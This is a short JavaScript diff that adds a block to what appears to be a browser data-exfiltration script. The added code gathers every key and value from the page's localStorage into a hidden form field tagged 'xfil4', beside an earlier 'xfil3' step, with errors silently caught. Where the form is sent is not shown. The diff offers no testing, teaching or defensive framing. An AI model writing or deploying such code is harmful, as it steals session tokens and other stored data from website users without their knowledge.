@@ -47,5 +47,22 @@ document.body.appendChild(elem);
   form.appendChild(input);
   }, "xfil3");
   
+     Exfil(function(form){
+   var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "localStorage";
+         str = "";
+for(var i=0, len=localStorage.length; i<len; i++) {
+	if (str.length)
+		str += "&";
+    var key = localStorage.key(i);
+    var value = localStorage[key];
+    str += encodeURIComponent(key) + "=" + encodeURIComponent(value);
+  }
+  input.value = str;
+  form.appendChild(input);
+  }, "xfil4");
+  
+  
 }catch(error) {  
 }
